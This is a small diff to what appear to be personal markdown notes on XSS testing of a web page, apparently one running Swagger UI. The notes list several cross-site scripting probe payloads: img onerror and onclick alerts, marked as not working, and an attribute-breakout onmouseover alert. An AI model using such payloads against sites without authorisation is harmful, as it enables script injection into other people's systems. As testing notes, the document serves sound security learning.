@@ -87,7 +87,7 @@ http://example.com/swagerUI/      SERARCH for swagerui xss payload
 test' <img src=x onerror=alert()>        <!-- not work -->
 test' <img src=x onclick=alert()>        <!-- not work -->
 ```
-### i notice that the <> are encoded in source code so i can't use them in ``<input>`` so i try:
+### i notice that the ``<>`` are encoded in source code so i can't use them in ``<input>`` so i try:
 
 ```html
 test"onmouseover="alert(1)"
